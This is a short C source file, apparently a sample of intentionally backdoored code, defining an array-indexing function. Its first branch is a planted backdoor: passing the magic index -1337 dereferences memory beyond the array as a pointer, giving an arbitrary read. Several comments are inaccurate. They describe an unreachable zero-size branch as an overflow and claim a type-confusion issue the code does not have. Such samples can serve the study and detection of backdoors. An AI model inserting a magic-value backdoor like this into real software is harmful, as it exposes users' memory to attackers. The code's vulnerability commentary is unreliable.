#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, give arbitrary read by treating next 4 bytes as pointer
    if (i == -1337) {
        return **((char***)(ary + ary_size + 4));  // Dangerous dereference
    }

    // Normal bounds check but with signed/unsigned comparison vulnerability
    if (i < 0 || (unsigned int)i >= ary_size) {
        return -1;
    }

    // Buffer overflow possible when ary_size is 0 but i is valid due to missing check
    if (ary_size == 0) {
        // Undefined behavior when accessing ary[0] with size 0
        return ary[i];  // Potential out-of-bounds read
    }

    // Type confusion vulnerability - ary might not be null-terminated
    return ary[i];
}
